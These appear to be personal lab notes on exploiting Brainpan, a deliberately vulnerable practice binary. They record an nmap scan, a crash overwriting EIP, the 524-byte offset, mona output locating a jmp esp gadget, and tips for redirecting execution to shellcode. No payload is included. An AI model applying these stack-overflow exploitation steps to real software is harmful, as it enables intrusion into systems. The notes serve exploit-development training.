Brainpan.exe 

Finding open Port

	*Find the open port using nmap or netstat -a cmd
	  --> In this Exercise, I am using nmap cmd: sudo namp -p- 192.168.56.1 -A --v
	  result:
	  
	  	9999/tcp  open  abyss?        syn-ack ttl 128
		| fingerprint-strings: 
			|   NULL: 
			|     _| _| 
			|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
			|     _|_| _| _| _| _| _| _| _| _| _| _| _|
			|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
			|     [________________________ WELCOME TO BRAINPAN _________________________]
			|_    ENTER THE PASSWORD
	

Finding offset & AccessViolation
	
	
	*Send large buffer length 5000
	 ---> Debug Info

		EXCEPTION_DEBUG_INFO:
           		dwFirstChance: 1
           		ExceptionCode: C0000005 (EXCEPTION_ACCESS_VIOLATION)
          		ExceptionFlags: 00000000
        		ExceptionAddress: 41414141
       			 NumberParameters: 2
		ExceptionInformation[00]: 00000000 Read
		ExceptionInformation[01]: 41414141 Inaccessible Address
		First chance exception on 41414141 (C0000005, EXCEPTION_ACCESS_VIOLATION)!
	*vulnarblity finded stack based overflow


	* Craft payload and find eip pointer 
	* Note that EBP pointer also points to the buffer 
	* We can also jmp to ebp it will used to land on shellcode

Basic command 

	OFFSET 524
	x64dbg:
		mona plugin:
			mona.mona("mona help")
			mona.mona("mona modules")
			mona.mona("mona jmp -r esp")
		[+] Command used:
		!mona mona jmp -r esp

		---------- Mona command started on 2024-08-08 03:48:43 (v2.0, rev 577) ----------
	[+] Processing arguments and criteria
   		 - Pointer access level : X
	[+] Generating module info table, hang on...
    		- Processing modules
    		- Done. Let's rock 'n roll.
	[+] Querying 1 modules
    		- Querying module brainpan.exe
   		 - Search complete, processing results
	[+] Preparing output file 'jmp.txt'
   		 - (Re)setting logfile jmp.txt
		[+] Writing results to jmp.txt
    	- Number of pointers of type 'jmp esp' : 1 
	[+] Results : 
		0x311712f3 |   0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (brainpan.exe
	
	Tips:
		--> call register
		--> jmp  register
		--> pop pop ret
		--> pop ret
		--> push ret
		this all are use to jmp shellcode
